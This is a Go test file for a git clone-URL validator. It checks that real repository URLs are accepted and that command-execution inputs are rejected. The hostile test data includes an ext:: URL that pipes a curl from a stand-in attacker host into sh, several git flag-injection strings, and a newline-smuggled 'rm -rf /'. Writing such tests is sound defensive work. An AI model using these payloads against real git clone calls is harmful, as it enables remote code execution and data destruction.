package api

import (
	"strings"
	"testing"
)

func TestValidateCloneURLAllowsRealRepositories(t *testing.T) {
	ok := []string{
		"https://github.com/owner/name.git",
		"https://github.com/owner/name",
		"http://git.internal.example/owner/name.git",
		"ssh://git@github.com/owner/name.git",
		"git://git.example.com/name.git",
		"git@github.com:owner/name.git",
		"/home/me/repos/demo",
		"/tmp/demo-repo",
		`C:\Users\me\repos\demo`, // Windows paths carry a single colon
		"file:///home/me/repos/demo",
		"../sibling-repo",
	}
	for _, u := range ok {
		if err := ValidateCloneURL(u); err != nil {
			t.Errorf("ValidateCloneURL(%q) rejected a valid URL: %v", u, err)
		}
	}
}

// The two shapes that turn `git clone` into command execution.
func TestValidateCloneURLRejectsCodeExecution(t *testing.T) {
	bad := []struct {
		url, because string
	}{
		{`ext::sh -c 'curl evil.example/x | sh'`, "ext:: runs a command"},
		{"ext::whoami", "ext:: runs a command"},
		{"EXT::sh -c id", "case must not matter"},
		{"transport::anything", "any remote helper is refused"},
		{"--upload-pack=sh -c id", "a leading dash is read as a git flag"},
		{"-u./payload", "a leading dash is read as a git flag"},
		{"--config=core.sshCommand=id", "a leading dash is read as a git flag"},
	}
	for _, c := range bad {
		err := ValidateCloneURL(c.url)
		if err == nil {
			t.Errorf("ValidateCloneURL(%q) was accepted; %s", c.url, c.because)
			continue
		}
		// The error should explain itself, not just say "invalid".
		if len(err.Error()) < 30 {
			t.Errorf("ValidateCloneURL(%q) error is too terse: %v", c.url, err)
		}
	}
}

func TestValidateCloneURLRejectsJunk(t *testing.T) {
	bad := []string{
		"",
		"   ",
		"https://example.com/repo\nrm -rf /",
		"https://example.com/repo\x00",
		"telnet://example.com/repo",
		"javascript://example.com",
	}
	for _, u := range bad {
		if err := ValidateCloneURL(u); err == nil {
			t.Errorf("ValidateCloneURL(%q) should have failed", u)
		}
	}
}

// The error text has to tell the operator what to do instead, because this
// will occasionally reject something someone typed by hand.
func TestValidateCloneURLErrorsAreActionable(t *testing.T) {
	err := ValidateCloneURL("ext::sh -c id")
	if err == nil {
		t.Fatal("expected an error")
	}
	if !strings.Contains(err.Error(), "https://") {
		t.Errorf("the error should suggest a valid form, got: %v", err)
	}
}
